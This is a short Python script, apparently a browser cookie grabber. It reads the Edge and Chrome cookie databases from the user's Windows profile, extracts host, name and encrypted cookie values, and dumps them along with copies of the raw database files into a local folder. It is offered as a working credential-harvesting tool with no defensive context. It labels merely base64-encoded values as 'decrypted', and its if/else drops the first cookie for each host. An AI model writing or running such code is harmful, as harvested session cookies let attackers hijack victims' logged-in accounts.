import os
import json
import base64
import sqlite3



def get_cookies(path: str):
    data = bytes()

    if not os.path.exists(path):
        return ({
            'ERR': 'FIND_ERR'
        }, b'')

    try:
        connection = sqlite3.connect(path)

        with open(path, 'rb') as file:
            data = file.read()
            
    except sqlite3.OperationalError:
        return ({
            'ERR': 'OPEN_ERR'
        }, b'')
        
    except Exception as exception:
        return ({
            'ERR': str(exception)
        },
        b''
    )
        
    cursor = connection.cursor()
    cookies = {}

    cursor.execute(
        'SELECT host_key,'
        'name,'
        'encrypted_value FROM cookies'
    )
    
    for host_key, name, encrypted_value in cursor.fetchall():
        if host_key not in cookies:
            cookies[host_key] = {}

        else:
            decrypted_value = base64.b64encode(encrypted_value).decode('utf-8')
            cookies[host_key][name] = decrypted_value
    
    connection.close()
    return (cookies, data)



edge_cookies, edge_data = get_cookies(fr'{os.environ['LOCALAPPDATA']}\Microsoft\Edge\User Data\Default\Network\Cookies')
chrome_cookies, chrome_data = get_cookies(fr'{os.environ['LOCALAPPDATA']}\Google\Chrome\User Data\Default\Network\Cookies')


os.makedirs('cookies', exist_ok=True)

with open('cookies/edge_cookies.json', 'w') as file:
    json.dump(edge_cookies, file, indent=4)

with open('cookies/chrome_cookies.json', 'w') as file:
    json.dump(chrome_cookies, file, indent=4)

with open('cookies/edge_cookies', 'wb') as file:
    file.write(edge_data)

with open('cookies/chrome_cookies', 'wb') as file:
    file.write(chrome_data)


print('Success!')
